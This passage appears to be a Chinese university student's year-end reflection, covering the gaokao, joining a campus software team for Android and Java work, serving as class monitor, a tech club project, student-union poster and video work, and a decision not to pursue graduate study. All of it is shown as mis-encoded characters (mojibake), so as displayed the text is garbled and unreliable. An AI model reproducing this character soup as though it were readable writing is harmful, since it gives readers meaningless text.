ä¸ºå®ƒä»¬éƒ½éšç€é«˜è€ƒçš„ç»“æŸè€Œæˆªæ­¢äº†ã€‚æˆ‘èƒ½è®°ä½çš„åªæœ‰é«˜ä¸­ç”Ÿæ´»ä¸­é‚£äº›æ— å…³äºŽå­¦ä¹ çš„é‚£äº›ï¼Œé‚£äº›åœ¨é«˜ä¸‰çš„å¿™ç¢Œä¸­å·å¾—çš„é—²æš‡ï¼Œé‚£äº›ä¸‰å¹´æ¥æœå¤•ç›¸å¤„çš„çè´µã€‚ è€Œæˆç»©ä¸Žæœ€åŽçš„ç»“æžœï¼ŒçŽ°åœ¨çœ‹æ¥éƒ½æ˜¯ä¸€ç§å¿…ç„¶ï¼Œæ— è®ºæœ€ç»ˆçš„ç»“æžœå¦‚ä½•ï¼Œéƒ½ä¼šæœ‰ä¸€ç§æ–¹å¼è®©æˆ‘å¥½å¥½çè§†çŽ°åœ¨ï¼Œåƒé«˜ä¸­è¯­æ–‡è€å¸ˆå¯„è¨€çš„é‚£æ ·ï¼šäººç”Ÿçš„æ¯ä¸ªé˜¶æ®µéƒ½ä¼šæœ‰æ¯ä¸ªé˜¶æ®µçš„ç—›è‹¦ä¸Žå¿«ä¹ã€‚ æˆ‘ä¸æ›¾ä¸ºè‡ªå·±ä¹‹å‰åšè¿‡çš„ä»»ä½•ä¸€ä¸ªå†³å®šåŽæ‚”è¿‡ï¼Œå®ƒä»¬çš„ç»“æžœæˆ–å·²å˜æˆå¥½çš„é‚£æ–¹é¢ï¼Œæˆ–å·²ä¸å†é‡è¦ã€‚æ€§æ ¼å¦‚æ­¤ï¼Œæˆ‘åªå…³æ³¨çŽ°åœ¨çš„äº‹æƒ…ï¼Œè¿‡åŽ»çš„äº‹æƒ…ä¼šå¾ˆå¿«æ”¾ä¸‹ï¼Œä»Žè€Œå°½å¿«æ‰¾åˆ°ä¸€ç§é€‚åˆçš„æ–¹å¼å¥½å¥½é¢å¯¹å½“ä¸‹çš„é‚£äº›æˆ–å¥½æˆ–åçš„äº‹æƒ…ã€‚ åœ¨é«˜ä¸­æ—¶æœŸæ²¡æœ‰æƒ³è¿‡è‡ªå·±ä¸€å®šä¼šåŽ»å“ªä¸€ä¸ªå­¦æ ¡ï¼Œä½†ç›´è§‰å‘Šè¯‰æˆ‘ä¸€å®šä¼šæœ‰ä¸€æ¡è·¯åœ¨é‚£é‡Œç­‰ç€æˆ‘ï¼Œæˆ‘æ²¡æœ‰è®¡åˆ’è¿‡é«˜è€ƒè¦è€ƒå¤šå°‘åˆ†ï¼Œä¹Ÿæ²¡æœ‰æ‹¼å‘½åœ°ä¸ºäº†æ‰€è°“çš„ä¸æµªè´¹åŽ»å„ç§æ£åº¦å¿—æ„¿åº”è¯¥æ€Žä¹ˆå¡«ï¼Œåœ¨é«˜ä¸­çš„æœ€åŽé˜¶æ®µï¼Œæ”¯æŒç€æˆ‘çš„æ˜¯å†ä¹Ÿä¸ä»¥åˆ†æ•°é«˜ä½Žè®ºæ–­ä¸€ä¸ªäººçš„æˆè´¥çš„æœªæ¥å’Œå­¦ä¹ çœŸæ­£æ„¿æ„ä¸ºä¹‹ä»˜å‡ºç²¾åŠ›çš„ä¸œè¥¿ã€‚ æœ€ä»¤æˆ‘æ„Ÿåˆ°å¹¸è¿çš„æ˜¯æˆ‘åœ¨å¾ˆæ—©çš„æ—¶å€™æˆ‘å°±çŸ¥é“æ„¿æ„åŽ»ä¸ºä»€ä¹ˆä»˜å‡ºè‡ªå·±çš„çƒ­è¡€ï¼Œè¿™è®²èµ·æ¥åˆæ˜¯å¦ä¸€ä¸ªæ•…äº‹äº†ï¼Œä½†æ˜¯ä»Žæˆ‘æœ‰å¤§å­¦ä¸“ä¸šè¿™ä¸ªæ¦‚å¿µä»¥æ¥ï¼Œæˆ‘ä»Žæ¥æ²¡æœ‰è€ƒè™‘è¿‡é™¤è®¡ç®—æœºç›¸å…³ä»¥å¤–çš„ä»»ä½•ä¸€ä¸ªä¸“ä¸šã€‚æ‰€ä»¥åœ¨æš‘å‡é«˜è€ƒæˆç»©å‡ºæ¥çš„é‚£ä¸€åˆ»èµ·åŽç§‘å°±æˆäº†æˆ‘æœ€å¥½ä¸”æ˜¯å”¯ä¸€çš„é€‰æ‹©ã€‚æˆ‘çš„å¿—æ„¿åœ¨ç³»ç»Ÿå¼€æ”¾ååˆ†é’Ÿä»¥å†…å°±å¡«å¥½äº†ï¼Œæˆ‘æƒ³è¿™å°±æ˜¯æˆ‘å‰é¢æ‰€è¯´çš„é‚£ç§å¿…ç„¶ã€‚ åŽç§‘æ¥åŽç§‘ä»¥åŽçš„ç”Ÿæ´»ä¼¼ä¹Žå°±æˆå˜å¤šçº¿ç¨‹çš„äº†ï¼ŒåŠ å…¥äº†å¾ˆå¤šçš„å­¦ç”Ÿç»„ç»‡ï¼Œä¸€åº¦è®©æˆ‘åœ¨æ—¶é—´å®‰æŽ’ä¸Šæ„Ÿåˆ°éžå¸¸çˆ†ç‚¸ï¼Œä½†æ˜¯ä¸ç®¡æ€Žä¹ˆæ ·æŽ¥ä¸‹çš„é”…æˆ‘éƒ½ä¼šå¥½å¥½èƒŒåˆ°åº•çš„ã€‚å¯¹æ¥åŽç§‘ä»¥åŽè¿™æ®µæ—¶é—´çš„æ€»ç»“å°±æŒ‰èº«ä»½ä¸åŒåˆ†æˆå‡ ä¸ªæ–¹é¢å§ã€‚ è”åˆ›å›¢é˜Ÿå…³äºŽåŽç§‘çš„ä¸€åˆ‡å°±æ˜¯ä»Žé‚£æ—¶å¼€å§‹äº†è§£çš„ï¼Œè€Œå¯¹äºŽåŽç§‘çš„ä¸‰å¤§å›¢é˜Ÿç½‘ä¸Šå¾ˆé«˜çš„è¯„ä»·å’Œå’¨è¯¢ç¾¤ä¸­è¡¨çŽ°å‡ºæ¥çš„æ€åº¦å°±è¶³å¤Ÿä»¤äººå‘å¾€ï¼Œè€Œä»¤ä¸€æ–¹é¢ä¹Ÿè®©æˆ‘å¯¹è‡ªå·±çš„æ°´å¹³å¿ƒç”Ÿæ€€ç–‘ï¼Œè™½ç„¶æ—©å°±æœ‰å­¦è®¡ç®—æœºçš„æ‰“ç®—ä½†ä¹‹å‰å´æ²¡æœ‰æ¡ä»¶è®©æˆ‘åœ¨è¿™æ¡è·¯ä¸Šæ›´æ·±ä¸€æ­¥ï¼Œè¿™æ ·çš„å¿ƒæ€ç”šè‡³è®©æˆ‘ä¸€åº¦åœ¨è”åˆ›æ‹›æ–°çš„æ—¶å€™ä¸æ•¢åŽ»æŠ•å‡ºä¸€ä»½æ‰€è°“çš„ç®€åŽ†ã€‚æ­£å¦‚é‚£æ—¶æ‰€è¯´çš„é‚£æ ·ï¼Œæˆ‘æ·±çŸ¥è‡ªå·±çš„æ°´å¹³è¿˜ä¸è¶³ä»¥åŠ å…¥è”åˆ›ï¼Œä½†æ˜¯æˆ‘å´æœ‰äº†åŽ»æå‡è‡ªå·±çš„æ¬²æœ›å’Œå‰è¿›çš„åŠ¨åŠ›ã€‚ å½“æ—¶åœ¨æ‹›æ–°å¿«è¦ç»“æŸçš„æ—¶å€™æ­£å¥½ç­ä¸»ä»»ï¼ˆå¤§å››å­¦é•¿ï¼‰æ¥æˆ‘å¯å®¤ï¼Œé—²èŠä¸­æˆ‘è¯´èµ·æŠ¥åè¿™äº‹ï¼Œä»–è¡¨ç¤ºï¼šæŠ¥ä¸ªååˆä¸ä¼šæœ‰ä»€ä¹ˆæŸå¤±ï¼Œä¸ºä»€ä¹ˆä¸è¯•ä¸€è¯•å‘¢ï¼ŸçŽ°åœ¨çœ‹æ¥é‚£æ—¶å€™æˆ‘çš„å¿ƒæ€ç¡®å®žå¾ˆå¥‡æ€ªï¼Œæƒ³åŽ»è¿½æ±‚çš„ä¸œè¥¿å› ä¸ºæ‹…å¿ƒè‡ªå·±çš„èƒ½åŠ›è¿žç¬¬ä¸€æ­¥éƒ½ä¸æ•¢è¸å‡ºï¼Œå¤§æ¦‚æ˜¯å¤ªè¿‡äºŽæ‹…å¿ƒè‡ªå·±ä¼šå¤±è´¥å§ã€‚ æ‰€ä»¥åœ¨ç¦»æŠ¥åæˆªæ­¢è¿˜æœ‰ä¸¤å¤©çš„æ—¶å€™æˆ‘åŒæ—¶æŠ¥äº†è”åˆ›å’Œå†°å²©çš„åï¼Œç¬¬ä¸€æ¬¡é¢è¯•æ˜¯å†°å²©çš„ä¸€é¢ï¼Œå› ä¸ºå¤ªè¿‡ç´§å¼ ä»¥è‡³äºŽè¯­æ— è®ºæ¬¡ï¼Œè®²èµ·æ¥ä¹Ÿæ²¡æœ‰ä»€ä¹ˆé€»è¾‘ã€‚é¢è¯•ä»¥åŽå°±è§‰å¾—è‡ªå·±è·ªäº†ã€‚ä¹‹åŽæ˜¯è”åˆ›çš„ç¬”è¯•ï¼ŒåªçŸ¥é“Androidä¼šè€ƒJavaï¼Œæ‰€ä»¥æå‰ä¸€å¤©ä¹°äº†æœ¬Javaä¹¦çœ‹ï¼Œæœ¬æ¥ä¹Ÿæ²¡æœ‰å¯¹ç¬”è¯•æŠ±å¤šå¤§çš„å¸Œæœ›ï¼Œé¢˜ç›®é‡Œé¢å…³äºŽé¢å‘å¯¹è±¡çš„å†…å®¹è¿˜æ˜¯æ ¹æ®ä¹‹å‰çœ‹è¿‡çš„C++çš„é‚£å¥—ä¸œè¥¿ç­”çš„ã€‚æ‰€ä»¥åœ¨åŽé¢æ”¶åˆ°äºŒé¢é€šçŸ¥çš„æ—¶å€™è¿˜æ˜¯è§‰å¾—ååˆ†æƒŠå–œçš„ã€‚ é¢è¯•æˆ‘çš„æ˜¯æœ±ä¸€ç™¾å’ŒçŽ‹å¯èŒï¼Œè®°å¾—é‚£å¤©æˆ‘ä»¬èŠçš„æŒºå¼€å¿ƒçš„ï¼Œä¹Ÿæ˜¯æˆ‘ç¬¬ä¸€æ¬¡çœ‹åˆ°808ï¼Œé‚£æ—¶å€™ç¬¬ä¸€æ¬¡æ„Ÿè§‰åˆ°è‡ªå·±ç¦»è¿™æ ·ä¸€ä¸ªå›¢é˜Ÿè¿™ä¹ˆè¿‘ã€‚ä¹‹åŽç»™äº†ä¸‰ä¸ªç¤¼æ‹œçš„æ—¶é—´å‡†å¤‡ç†¬æµ‹ï¼Œæ­£å¥½å›½åº†æ”¾å‡ï¼ŒæŠŠä¹°çš„Javaå’ŒAndroidçš„ä¹¦å¸¦å›žåŽ»ç”¨æœ€å¿«çš„é€Ÿåº¦çœ‹ï¼Œæ„Ÿè§‰é‚£æ ·è¿™ä¹ˆç”¨å¿ƒåœ°ä¸ºäº†ä¸€ä¸ªç›®æ ‡åŠªåŠ›çš„æ—¶å€™çœŸæ˜¯éžå¸¸éš¾å¾—ã€‚ å†ä¹‹åŽçš„äº‹æƒ…ä¼¼ä¹Žåˆåœ¨æ„æ–™ä¹‹å†…äº†ï¼Œè¶Šåˆ°åŽé¢è¶Šæ„Ÿåˆ°è‡ªå·±èƒ½å®žçŽ°è¿™ä»¶äº‹ï¼Œæ‰€ä»¥è¿™ä»¶äº‹ä¹Ÿå°±è¿™æ ·å®žçŽ°äº†ã€‚ è”åˆ›çš„ä¸€åˆ‡ä¹Ÿå¦‚åŒæˆ‘æƒ³çš„é‚£æ ·ï¼Œæœ‰ä¸€ç¾¤å¿—åŒé“åˆçš„ä¼™ä¼´å’Œå„ç§æ–¹é¢éƒ½éžå¸¸å¼ºçš„èšèšå­¦é•¿ã€‚åŠ å…¥è”åˆ›çš„ç¬¬ä¸€ä¸ªæ”¶èŽ·å°±æ˜¯è®©æˆ‘èƒ½çœ‹åˆ°æ›´å¤§çš„ä¸–ç•Œæ˜¯ä»€ä¹ˆæ ·å­ï¼ŒçŸ¥é“åŒé¾„çš„äººå¯ä»¥åšåˆ°ä»€ä¹ˆæ ·å­ï¼Œæ›´é‡è¦çš„æ˜¯ï¼Œä»–ä»¬å°±åœ¨æˆ‘èº«è¾¹ã€‚è¿™æ ·çš„æ°›å›´æˆ‘æƒ³åœ¨å…¶ä»–çš„ä»»ä½•åœ°æ–¹éƒ½å¾ˆéš¾æ‰¾åˆ°ã€‚ å®žä¹ ä¸‰ä¸ªå¤šæœˆï¼Œä»Žç¬¬ä¸€ä¸ªç¤¼æ‹œæ²¡æœ‰å®‰å“åŸºç¡€å†™å‡ºç¬¬ä¸€ä¸ªAPPï¼ŒæŽ¥åˆ°ç¬¬ä¸€ä¸ªJavaé¡¹ç›®ï¼Œåˆ°ç»„é˜Ÿä¸€èµ·å†™å‡ºä¸€ä¸ªæ¸¸æˆæ‰“æ¯”èµ›ï¼Œå†åˆ°è‡ªå·±åŽ»å®žçŽ°è‡ªå·±çš„ä¸€äº›æƒ³æ³•ï¼Œå…¶ä¸­çš„æˆé•¿ä¸è¨€è€Œå–»ã€‚ åšAPPçš„è¿‡ç¨‹å…¶å®žåœ¨DRé‡Œé¢å·²ç»æœ‰è®°å½•ï¼Œåœ¨è¿™é‡Œå°±ä¸ä¸€ä¸€ç»†æ•°ã€‚æ€»çš„çœ‹æ¥ï¼Œæœ‰ä¸€äº›æ”¶èŽ·å¯¹æˆ‘ä»¥åŽçš„å­¦ä¹ æœ‰ç€å¾ˆå¤§çš„å¸®åŠ©ï¼š å­¦ä¼šä½¿ç”¨Googleï¼Œä¹ æƒ¯åœ¨è‹±æ–‡çŽ¯å¢ƒä¸‹è§£å†³é—®é¢˜ï¼Œä»Žä¸€å¼€å§‹å¯¹æ»¡å±çš„è‹±æ–‡ä¸çŸ¥æ‰€æŽªåˆ°åŽé¢å¯ä»¥ç­›é€‰å‡ºè‡ªå·±æƒ³è¦çš„ä¿¡æ¯ï¼Œå¯¹æˆ‘çš„è‹±è¯­èƒ½åŠ›ä¹Ÿæ˜¯ä¸€ç§æå‡ã€‚ï¼ˆæ„Ÿè°¢Mentoré¡ºæ‰‹æ”¹çš„æœç´¢ç»“æžœæ˜¾ç¤ºè¯­è¨€ï¼‰ çœ‹æ–‡æ¡£å†™ä»£ç è€Œä¸æ˜¯çœ‹Demoè·Ÿç€å†™ï¼Œä¸€å¼€å§‹é‡åˆ°ä¸ä¼šå®žçŽ°çš„ä¸œè¥¿éƒ½æ˜¯å…ˆæ‰¾åˆ«äººçš„å®žçŽ°å†å¥—ç”¨åˆ°è‡ªå·±çš„æƒ…å¢ƒä¸­ï¼ŒåŽæ¥æ˜Žç™½å®˜æ–¹æä¾›çš„æ–‡æ¡£å°±æ˜¯æœ€å¥½çš„å‚è€ƒèµ„æ–™ï¼Œè™½ç„¶æœ‰äº›æ—¶å€™çœ‹Demoå†™å¯ä»¥æ›´å¿«çš„å®žçŽ°ï¼Œä½†æ˜¯å›žè¿‡å¤´æ¥çœ‹çœ‹æ–‡æ¡£æ€»èƒ½å‘çŽ°ä¸€äº›æ–°ä¸œè¥¿ä»Žè€ŒåŠ å¼ºè‡ªå·±çš„ç†è§£ã€‚æ¯•ç«Ÿåªæœ‰è‡ªå·±å†™å‡ºæ¥çš„ä¸œè¥¿æ‰æ˜¯è‡ªå·±çš„ã€‚ è®²ç©¶ä»£ç çš„è§„èŒƒæ€§é—®é¢˜ã€‚è¿™ä¸€ç‚¹Mentoråœ¨å¯¹æˆ‘ä»£ç çš„Reviewä¸­åå¤å¼ºè°ƒäº†å¾ˆå¤šæ¬¡ï¼Œå¸Œæœ›æˆ‘ä»Žä¸€å¼€å§‹å°±å…»æˆå¥½çš„ä¹ æƒ¯ã€‚ ç†Ÿæ‚‰è‡ªå·±çš„æ“ä½œçŽ¯å¢ƒï¼Œæé«˜æ•ˆçŽ‡ã€‚èŠ±äº†éžå¸¸å¤šçš„æ—¶é—´æ¥æŠ˜è…¾Linuxï¼Œç›®çš„å°±æ˜¯ä¸ºäº†ç»™è‡ªå·±ä¸€ä¸ªå¯ä»¥æŽ’é™¤å…¶ä»–å¹²æ‰°é«˜æ•ˆçŽ‡åœ°å·¥ä½œçš„çŽ¯å¢ƒã€‚ç†Ÿæ‚‰å„ç§å¿«æ·é”®å’Œæ’ä»¶ä¹Ÿæ˜¯é”»ç‚¼çš„ä¸€éƒ¨åˆ†ã€‚ é‡è§†åŸºç¡€ã€‚æœ‰å¾ˆå¤šå‰è¾ˆå‘Šè¯‰æˆ‘åŸºç¡€å†…å®¹éžå¸¸é‡è¦ï¼Œå°¤å…¶æ˜¯åƒæ•°æ®ç»“æž„ã€ç®—æ³•è¿™æ ·çš„å†…å®¹çœ‹ä¼¼å¹³å¸¸ç”¨ä¸åˆ°ï¼Œä½†æ˜¯å…³é”®æ—¶å€™çœ‹çš„å¾€å¾€å°±æ˜¯è¿™æ ·çš„åŸºæœ¬åŠŸã€‚æ‰€ä»¥æˆ‘å¼€å§‹æƒ³åŽ»èŠ±ä¸€äº›æ—¶é—´è®¤çœŸåœ°é™ä¸‹å¿ƒæ¥è¡¥ä¸€è¡¥è¿™äº›åŸºç¡€å†…å®¹ã€‚ å¼€å§‹å†™åšå®¢æ¥è®°å½•ä¸€äº›ä¸œè¥¿ã€‚å»ºäº†è‡ªå·±çš„åšå®¢ï¼Œè™½ç„¶çŽ°åœ¨åªæœ‰æ‰‹å¤´é¡¹ç›®ç›¸å…³çš„ä¸‰ç¯‡åšæ–‡ï¼Œå¾ˆå¤§ä¸€éƒ¨åˆ†åŽŸå› æ˜¯æˆ‘è®¤ä¸ºåšæ–‡å†…å®¹ä¸€å®šè¦æ˜¯è‡ªå·±ç†è§£æ¯”è¾ƒæ·±åˆ»çš„ä¸€äº›ä¸œè¥¿æ‰å€¼å¾—å†™ã€‚ç›®å‰è‡ªå·±æ°´å¹³ä¸é«˜çš„æƒ…å†µä¸‹çžŽå†™ä¸€äº›ä¸œè¥¿ä¹Ÿæ²¡æœ‰ä»€ä¹ˆä»·å€¼ï¼Œåº”è¯¥åœ¨ä¹‹åŽæŸä¸ªæ—¶å€™è§‰å¾—è‡ªå·±å¯¹æŸä¸ªä¸œè¥¿æœ‰è‡ªå·±çš„ç†è§£çš„æ—¶å€™æ‰ä¼šå¥½å¥½åœ°æŠŠè¿™äº›åˆ†äº«ç»™åˆ«äººå§ã€‚ Gitä¸Žå›¢é˜Ÿåˆä½œï¼Œç›®å‰åˆä½œçš„ä¸¤ä¸ªé¡¹ç›®éƒ½æ˜¯é€šè¿‡gitå®Œæˆçš„ï¼Œä¸€å¼€å§‹ç”¨gitå‡ºçŽ°äº†å¾ˆå¤šé—®é¢˜ä½†æ˜¯åˆ°åŽé¢ç†Ÿæ‚‰ä»¥åŽå°±å¯ä»¥å¥½å¥½åˆ©ç”¨gitçš„åŠŸèƒ½äº†ã€‚ å…¶å®žå­¦åˆ°çš„ä¸œè¥¿è¿œä¸æ­¢ä¸Šé¢æ€»ç»“çš„è¿™äº›ï¼Œå¾ˆå¤šä¸œè¥¿éƒ½æ˜¯ä»Žä¸Žå…¶ä»–äººçš„æŽ¥è§¦ä¸­æ…¢æ…¢å­¦ä¼šçš„ï¼Œæ€»ä¹‹å¾ˆè£å¹¸å¯ä»¥æŽ¥è§¦åˆ°è¿™ä¸ªå­¦æ ¡æœ€ä¼˜ç§€çš„ä¸€ç¾¤äººã€‚ ç­é•¿å¤§å­¦æŽ¥ä¸‹ç­é•¿èŒåŠ¡æ˜¯æƒ³å‘æŒ¥ä¸€ä¸‹è‡ªå·±æžäº‹çš„å¤©èµ‹ï¼Œå¸Œæœ›èƒ½å¤Ÿé€šè¿‡è‡ªå·±çš„ä¸€äº›è¡ŒåŠ¨åŽ»ä¸ºå¤§å®¶åšä¸€äº›äº‹æƒ…ã€‚å¹³æ—¶ç»™åŒå­¦ã€ç­å§”å¼€ä¼šä¹Ÿæ˜¯å¯¹è‡ªå·±çš„é”»ç‚¼ã€‚æ„Ÿè°¢åœ¨æœ€å¿™çš„é‚£äº›æ—¶å€™æœ‰å…¶ä»–çš„ç­å§”ä¸»åŠ¨å¸®æˆ‘åˆ†æ‹…ã€‚ç­ä¸Šæœ‰ä¸€ç¾¤å¯çˆ±çš„åŒå­¦ä»¬ï¼Œè™½ç„¶è¯´å¤§å­¦åŒå­¦ä¸ä¼¼é«˜ä¸­é‚£æ ·æœå¤•ç›¸å¤„ï¼Œä½†æ˜¯æˆ‘å¸Œæœ›å¤§å®¶å¯ä»¥ä¸€èµ·ç•™ä¸‹ä¸€äº›ç¾Žå¥½çš„å›žå¿†ã€‚ ç¾Žå›¢ç‚¹è¯„æŠ€æœ¯ä¿±ä¹éƒ¨ä¸€å¼€å§‹è‡ªå·±å¯¹å­¦ç”Ÿç»„ç»‡çš„æ‰“ç®—æ˜¯ä¸€ä¸ªæŠ€æœ¯å›¢é˜Ÿå’Œå­¦ç”Ÿç»„ç»‡ã€‚å› ä¸ºæš‘å‡æ°´ç¾¤çš„æ—¶å€™å°±è·Ÿå®‰ç¥ºå’Œè´Ÿè´£ç§‘åˆ›çš„å¤§å”èŠè¿‡ï¼Œå¼€å­¦ä¿±ä¹éƒ¨æ‹›æ–°çš„æ—¶å€™ä¹Ÿè·Ÿå®‰ç¥ºå¤§å”ç®€å•èŠäº†ä¸€ä¸‹ï¼ŒäºŽæ˜¯å°±æ¥äº†åˆšæˆç«‹çš„ç¾Žå›¢ã€‚ å› ä¸ºç¾Žå›¢åˆšæˆç«‹æˆå‘˜ä¹Ÿç‰¹åˆ«å°‘ï¼Œæ‰€ä»¥å¤§å®¶å¾ˆå¿«å°±ç†Ÿæ‚‰äº†ï¼Œ ç¾Žå›¢çš„ç¾¤ä¹Ÿæˆäº†æˆ‘ä»¬æ—¥å¸¸é—²æ‰¯çš„åœ°æ–¹ã€‚è€Œå­¦é™¢ä»Šå¹´ä¸ºç§‘åˆ›çš„å„ä¸ªä¿±ä¹éƒ¨æ–°è£…ä¿®çš„åœºåœ°ä¹Ÿå°±åœ¨æˆ‘å¯å®¤çš„é¡¶æ¥¼ï¼Œå¯¹äºŽæˆ‘ä»¬æ¥è¯´æ˜¯ä¸€ä¸ªå¤§ç¦åˆ©äº†ã€‚ åŽæ¥é€šè¿‡å­¦é™¢æŽ¥åˆ°çš„è‡ªå·±å’Œå”è‰ºå³°åˆä½œçš„ç¬¬ä¸€ä¸ªé¡¹ç›®ï¼Œåšä¸€ä¸ªè¡¨æ ¼å†…å®¹è¯†åˆ«çš„ä¸œè¥¿ã€‚åœ¨é‚£ä¸ªæ—¶å€™æˆ‘æ‰åˆšæœ‰ä¸€äº›JavaåŸºç¡€ï¼Œåœ¨æƒ³æŽ¥ä¸æŽ¥çš„æ—¶å€™åˆæƒ³èµ·äº†è‡ªå·±è€ƒè™‘æŠ¥ä¸æŠ¥è”åˆ›ä¸€æ ·çš„æƒ…æ™¯ã€‚è¿™æ¬¡æˆ‘æ²¡æœ‰å¤ªå¤šçŠ¹è±«ï¼Œä¸€æ˜¯å¤§ä¸€å°±æœ‰å¯èƒ½æŽ¥åˆ°é¡¹ç›®åšå¾ˆéš¾å¾—ï¼ŒäºŒæ˜¯é¡¹ç›®å¯¹è‡ªå·±çš„é”»ç‚¼ä¹Ÿæ˜¯éžå¸¸å¤§çš„ï¼Œä¸ç»™è‡ªå·±ä¸€äº›åŽ‹åŠ›å°±ä¸ä¼šåšæˆä¸€äº›äº‹æƒ…ã€‚ è¿™ä¸ªé¡¹ç›®ä¸­é—´è™½ç„¶ç»åŽ†äº†å¾ˆå¤šæ—¥å¸¸çš„ç»æœ›ï¼Œåƒå‰è¾ˆè¯´çš„é‚£æ ·è¸©è¿‡äº†å¾ˆå¤šçš„å‘ï¼Œä¾‹å¦‚PMæ”¹éœ€æ±‚ï¼Œä½†æ˜¯åˆ°æœ€åŽæ€»ç®—æ˜¯æŠŠç¬¬ä¸€æœŸå®Œæˆäº†ï¼Œè¿‡ç¨‹ä¸­ä¹Ÿæœ‰äº†è‡ªå·±ä¸‰ç¯‡åšæ–‡ã€‚ åŽé¢å­¦é™¢åˆè·Ÿä¼ä¸šåˆä½œæ‹¿åˆ°äº†ä¸€æ‰¹æ–°çš„é¡¹ç›®ï¼Œä¼°è®¡ä¸‹å­¦æœŸä¼šå¼€å§‹åšã€‚åœ¨ç§‘åˆ›è¿™è¾¹çš„æ´»åŠ¨æœ‰å­¦é™¢çš„æ”¯æŒä»¥åŽåœ¨é¡¹ç›®æ–¹é¢å°±æœ‰äº†ä¿è¯ã€‚å¸Œæœ›ä¿±ä¹éƒ¨è¿™è¾¹èƒ½åœ¨å­¦é™¢çš„æ”¯æŒä¸‹å¯ä»¥å¥½å¥½å‘å±•ã€‚ å­¦ç”Ÿä¼šå®£ä¼ éƒ¨æ­£å¦‚æ‹›æ–°çš„æ—¶å€™æ‰€è¯´çš„ï¼Œå­¦ç”Ÿä¼šæ˜¯ä¸€ä¸ªå¤§å®¶åº­ï¼Œåœ¨å®£ä¼ éƒ¨è®¤è¯†äº†å¾ˆå¤šéžå¸¸å¯çˆ±çš„å­¦å§å’Œå­¦é•¿ï¼Œä¹Ÿç»“è¯†äº†ä¸€äº›è·Ÿæˆ‘åŒå±Šçš„éƒ¨å‘˜ä»¬ã€‚ å®£ä¼ éƒ¨åšå‡ºæ¥çš„ä¸œè¥¿æ˜¯å®žå®žåœ¨åœ¨å¯ä»¥è¢«å¤§å®¶çœ‹åˆ°å’Œå…³æ³¨çš„ï¼Œçœ‹åˆ°è‡ªå·±åšå‡ºæ¥çš„æµ·æŠ¥è¢«è´´å‡ºæ¥çš„æ„Ÿè§‰çœŸçš„éžå¸¸å¥½ã€‚å°è¯•äº†ç¬¬ä¸€æ¬¡ç”¨æ¯”è¾ƒé•¿çš„ä¸€æ®µæ—¶é—´ç”¨å¿ƒåšä¸€å¼ çœŸæ­£æ„ä¹‰ä¸Šçš„æµ·æŠ¥ï¼Œç¬¬ä¸€æ¬¡ç”¨AEæ’¸å‡ºç¬¬ä¸€ä¸ªè§†é¢‘è¢«å¤§å®¶è½¬å‘ã€‚ å®£ä¼ éƒ¨çš„å¤§å®¶éƒ½å¾ˆæœ‰çˆ±ï¼ˆè™½ç„¶ç¾¤é‡Œæ€»æ˜¯gaygayçš„ï¼‰ï¼Œä½†æ˜¯æ¯æ¬¡é—®ä¸€äº›é—®é¢˜æ€»ä¼šæœ‰äººå›žç­”ã€‚ä¾‹ä¼šçš„é›¶é£Ÿã€éƒ¨é•¿çš„å®…èˆžã€åœ£è¯žçš„è´ºå¡â€¦â€¦è¿™ä¸€åˆ‡å›žå¿†èµ·æ¥æ€»æ˜¯é‚£ä¹ˆæ¸©é¦¨ã€‚ è¿™ä¸ªå­¦æœŸæŽ¥çš„é”…å…¶å®žå°±ä¸€å¼ æµ·æŠ¥ï¼Œè§†é¢‘çš„æ´»è¿˜æ²¡æœ‰å¼€å§‹æŽ¥ï¼Œè‡ªå·±ä¹Ÿå› ä¸ºè”åˆ›çš„äº‹æƒ…é¸½äº†ä¸€äº›æ´»åŠ¨ã€‚ä¸‹å­¦æœŸä¼šå¥½å¥½å¼¥è¡¥çš„ã€‚ å…³äºŽæœªæ¥æ€»ç»“ä¸‹æ¥è¿™ä¸€å¹´çš„æˆ‘ä¼¼ä¹Žæ²¡æœ‰é‡åˆ°ä»€ä¹ˆå¤ªå¤§çš„å›°éš¾ï¼ˆæˆ–è€…è¯´é‚£äº›å›°éš¾åˆ°çŽ°åœ¨çœ‹å·²ç»ç®—ä¸ä¸Šäº†ï¼‰ï¼Œä¸€åˆ‡éƒ½åœ¨å‘ç€å……æ»¡å¸Œæœ›çš„æ–¹å‘å‘å±•ç€ã€‚ç­ä¸»ä»»æ›¾å¯¹æˆ‘ä»¬è¯´è¿‡ä¸€å¥è¯ï¼šâ€œå¤§å®¶éƒ½å¸Œæœ›æˆä¸ºè‡ªå·±æƒ³è¦çš„æ ·å­ï¼Œä½†æ˜¯åˆ°æœ€åŽå¤§éƒ¨åˆ†éƒ½æˆäº†è‡ªå·±æ„¿æ„æˆä¸ºçš„æ ·å­ã€‚â€è®¡åˆ’æ€»æ˜¯èµ¶ä¸ä¸Šå˜åŒ–çš„ï¼Œæˆ‘ä¹Ÿæ˜¯ä¸€ä¸ªä¸å–„äºŽè®¡åˆ’çš„äººï¼Œæˆ‘å¯¹äºŽè‡ªå·±æœªæ¥çš„èµ°å‘çš„æ”¹å˜æ€»æ˜¯åœ¨å¹³æ—¶çš„ä¸€ä¸ªä¸ªå†³å®šä¸­ä¿ƒæˆçš„ï¼Œå¥½åœ¨çŽ°åœ¨çœ‹æ¥è¿˜æ˜¯èµ°åœ¨åº”è¯¥èµ°çš„è·¯ä¸Šã€‚ ä»ŽåŠ å…¥è”åˆ›çš„é‚£ä¸€åˆ»èµ·æˆ‘å·²ç»å†³å®šä¸è¯»ç ”ï¼ŒçŸ¥ä¹Žä¸Šçœ‹è¿‡ä¸€å¥è¯æ˜¯ï¼šâ€œå¤§å­¦æŠŠä¸€ä»¶äº‹åšåˆ°ç‰›é€¼æ‰è°ˆå¾—ä¸ŠæˆåŠŸçš„å¤§å­¦ç”Ÿæ´»ã€‚â€é‚£ä¹ˆæˆ‘æƒ³è¿™ä»¶äº‹å¯¹äºŽæˆ‘ä¸€å®šæ˜¯æŠ€æœ¯ï¼Œæœ‰è¿™æ ·çš„æ°›å›´å’Œæ¡ä»¶è®©æˆ‘åŽ»å¥½å¥½åšè¿™ä»¶äº‹å¿…ç„¶ä¸ä¼šè®©æˆ‘å¤±æœ›ã€‚æˆ‘ä¹Ÿå¸Œæœ›è‡ªå·±èƒ½çœŸæ­£åœ°ä¸“æ³¨åœ¨ä¸€ä»¶äº‹æƒ…ä¸Šã€‚ 